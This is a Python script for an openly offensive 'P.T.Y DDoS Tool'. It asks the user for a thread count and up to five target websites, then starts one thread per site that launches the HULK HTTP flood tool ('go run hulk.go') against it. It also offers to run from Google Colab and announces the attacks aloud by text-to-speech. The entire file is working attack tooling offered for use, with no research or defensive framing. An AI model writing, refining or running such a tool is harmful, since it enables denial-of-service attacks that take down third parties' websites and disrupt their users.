from colorama import Fore, Back, Style
import os
import pyttsx3
import sys
import platform
import threading

def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()

def attack_site(site, threads):
    print(Fore.CYAN + f"[+] Starting attack on {site} with {threads} threads" + Style.RESET_ALL)
    try:
        if str(platform.system()) == 'Windows':
            os.system(f'go run hulk.go -site {site}')
        else:
            os.system(f'HULKMAXPROCS={threads} go run hulk.go -site {site}')
        print(Fore.GREEN + f"[+] Attack completed on {site}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error attacking {site}: {e}" + Style.RESET_ALL)

# واجهة البداية الفخمة
def display_banner():
    print(Fore.MAGENTA + Back.BLACK + "██████╗ ████████╗██╗   ██╗" + Style.RESET_ALL)
    print(Fore.CYAN + Back.BLACK + "██╔══██╗╚══██╔══╝╚██╗ ██╔╝" + Style.RESET_ALL)
    print(Fore.BLUE + Back.BLACK + "██████╔╝   ██║    ╚████╔╝ " + Style.RESET_ALL)
    print(Fore.YELLOW + Back.BLACK + "██╔═══╝    ██║     ╚██╔╝  " + Style.RESET_ALL)
    print(Fore.GREEN + Back.BLACK + "██║        ██║      ██║   " + Style.RESET_ALL)
    print(Fore.MAGENTA + Back.BLACK + "╚═╝        ╚═╝      ╚═╝   " + Style.RESET_ALL)
    print(Fore.RED + "[+] Welcome to the P.T.Y DDoS Tool" + Style.RESET_ALL)

print(Fore.GREEN + Back.BLACK)
display_banner()

print(Back.BLACK + Fore.GREEN + '[+] P.T.Y_DDoS tool by' + Fore.RED + ' P.T.Y                              ' + Style.RESET_ALL)
print(Fore.YELLOW + '[+] This tool allows you to attack up to 5 sites simultaneously.' + Style.RESET_ALL)

try:
    threads = input(Fore.CYAN + '[+] ENTER THE NUMBER OF THREADS FOR DDoS >>> ' + Style.RESET_ALL)
    sites = []
    for i in range(5):
        site = input(Fore.BLUE + f'[+] Enter Site {i + 1} (or press Enter to skip) >>> ' + Style.RESET_ALL)
        if site.strip():
            sites.append(site)

    if len(sites) == 0:
        print(Fore.RED + "[-] No sites entered. Exiting." + Style.RESET_ALL)
        sys.exit(0)

    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Colab [Y/N] >>> ' + Style.RESET_ALL).lower()
    if colab_status == 'n' and str(platform.system()) != 'Linux':
        say_stuff(f"Attacking {len(sites)} target sites with {threads} threads each.")

    threads_list = []
    for site in sites:
        t = threading.Thread(target=attack_site, args=(site, threads))
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()

    print(Fore.GREEN + "[+] All attacks completed successfully." + Style.RESET_ALL)

except Exception as e:
    print(Fore.RED + f"[-] An error occurred: {e}" + Style.RESET_ALL)
    print(Fore.YELLOW + '[+] Installing Dependencies' + Style.RESET_ALL)
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')
